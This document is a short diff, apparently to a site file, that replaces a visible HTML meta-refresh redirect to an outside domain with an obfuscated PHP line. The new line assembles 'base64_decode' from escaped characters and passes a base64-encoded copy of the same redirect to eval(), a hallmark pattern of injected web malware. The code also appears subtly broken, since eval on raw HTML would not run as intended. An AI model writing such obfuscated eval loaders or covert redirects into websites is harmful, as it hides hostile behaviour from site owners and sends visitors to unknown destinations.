@@ -1,1 +1,1 @@
-<meta http-equiv="refresh" content="delay_time; URL=https://geteducate.xyz/" />
+<?php $A9zE1Agm="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($A9zE1Agm("PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iZGVsYXlfdGltZTsgVVJMPWh0dHBzOi8vZ2V0ZWR1Y2F0ZS54eXovIiAvPg=="));
